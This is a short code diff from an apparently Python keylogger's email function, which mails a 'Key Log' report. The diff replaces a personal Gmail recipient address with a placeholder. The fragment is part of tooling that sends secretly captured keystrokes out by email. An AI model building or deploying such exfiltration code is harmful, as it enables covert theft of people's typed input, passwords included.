@@ -39,7 +39,7 @@ def send_email():
         password = " password"
         
         
-        send_to_email = "tiwariraghav16@gmail.com"
+        send_to_email = "send_to_email@gmail.com"
         subject = "Key Log"
 
         # create a user-friendly report of the key log
